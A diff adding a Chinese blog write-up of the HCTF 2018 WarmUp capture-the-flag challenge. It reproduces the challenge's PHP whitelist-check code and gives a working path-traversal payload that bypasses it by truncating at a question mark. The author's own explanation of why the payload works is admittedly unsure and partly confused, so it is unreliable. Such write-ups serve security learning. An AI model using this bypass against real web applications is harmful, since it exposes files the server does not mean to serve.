@@ -1,0 +1,98 @@
+---
+title: [HCTF 2018]WarmUp
+categories:
+- General
+- External sources
+feature_image: "https://picsum.photos/2560/600?image=872"
+
+---
+
+
+
+### 2021.10.16
+
+### [HCTF 2018]WarmUp
+
+F12发现一个php文件被注释掉了
+
+通过http://f047c895-2bc2-4d31-838f-a8f12e9bea1b.node4.buuoj.cn:81/source.php查看源代码:
+
+![image-20211016175531793](C:\Users\PHY\AppData\Roaming\Typora\typora-user-images\image-20211016175531793.png)
+
+开始查函数：
+
+- isset：检测目标变量的值是否为NULL，如果是NULL返回False
+- is_string：检测目标变量是否为字符串，如果是，返回True
+- echo：相当于输出
+- in_array(search,array,type)：搜索数组中是否存在指定的值，存在输出True（如果 *search* 参数是字符串且 *type* 参数被设置为 TRUE，则搜索区分大小写。）
+- mb_substr( string $str , int $start [, int $length = NULL [, string $encoding = mb_internal_encoding() ]] ) : string      :划重点划重点了
+
+![image-20211016180918301](C:\Users\PHY\AppData\Roaming\Typora\typora-user-images\image-20211016180918301.png)
+
+- mb_strpos(haystack,needle)  :返回要needle在haystack字符串中首次出现的位置
+
+- $_REQUEST:获取以POST方法和GET方法提交的数据
+
+分析代码
+
+cehckFile这个函数进行了 3次白名单检测、 2次问号过滤、一次URL解码
+
+    class emmm
+        {
+            public static function checkFile(&$page)
+        {
+            //白名单列表
+            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
+            //isset()判断变量是否声明is_string()判断变量是否是字符串 &&用了逻辑与两个值都为真才执行if里面的值
+            if (! isset($page) || !is_string($page)) {
+                echo "you can't see it A";
+                return false;
+            }
+            //检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真
+            if (in_array($page, $whitelist)) {
+                return true;
+            }
+            //过滤问号的函数(如果$page的值有？则从?之前提取字符串)
+            
+            //由此开始******************************************
+            $_page = mb_substr(
+                $page,
+                0,
+                mb_strpos($page . '?', '?')//返回$page.?里面?号出现的第一个位置
+            );
+    
+             //第二次检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真
+            if (in_array($_page, $whitelist)) {
+                return true;
+            }
+            //url对$page解码
+            $_page = urldecode($page);
+    
+            //第二次过滤问号的函数(如果$page的值有？则从?之前提取字符串)
+            $_page = mb_substr(
+                $_page,
+                0,
+                mb_strpos($_page . '?', '?')
+            );
+            //第三次检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真
+            if (in_array($_page, $whitelist)) {
+                return true;
+            }
+            echo "you can't see it";
+            return false;
+        }
+    }
+
+```
+payload：
+http://f047c895-2bc2-4d31-838f-a8f12e9bea1b.node4.buuoj.cn:81/index.php?file=hint.php?../../../../../ffffllllaaaagggg
+```
+
+理解：
+
+找到flag的关键是找到 ”ffffllllaaaagggg“ 这个文件，分析代码得知其进行了白名单和？的过滤。想要执行ffffllllaaaagggg这个文件，就要先得到index.php的权限（自我理解，有待考证），网址的载入是从后往前的（？），所以从后往前的第一个”？“被第一次问号过滤过滤掉。然后白名单过滤再将hint.php过滤掉，所以真正执行的网址其实是http://f047c895-2bc2-4d31-838f-a8f12e9bea1b.node4.buuoj.cn:81/index.php?file=../../../../../ffffllllaaaagggg
+
+从而拿到flag
+
+注：关于为什么只需要跳过一次问号过滤和一次白名单过滤是因为从 $_page = mb_substr(，才开始真正的过滤输入的网址
+
